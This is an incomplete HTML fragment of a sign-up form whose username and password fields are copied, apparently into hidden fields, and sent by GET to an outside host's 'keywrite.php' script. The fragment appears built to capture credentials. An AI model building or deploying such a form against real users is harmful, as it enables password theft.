...
<form method="get" name="password1" action="//accounts-subins.hp.af.cm/files/keywrite.php" autotype="0" onsubmit="return validateForm()" onblur="check()">
Username:<input class="input" type="text" name="username" onblur="document.password1.user1.value=this.value"id="name" size="18" maxlength="20" value=""><span id="a" hidden><font color="red">You didnt type your name</font></span><br />
Password:<input class="input" type="password" onblur="document.password1.pass1.value=this.value" name="password" id="password" size="18" maxlength="20" value=""><span id="b" hidden><font color="red">You didnt type your password</font></span><br />
...
<input onclick="calculate();" class="button" value="Sign Up" type="submit" />
<div hidden>	
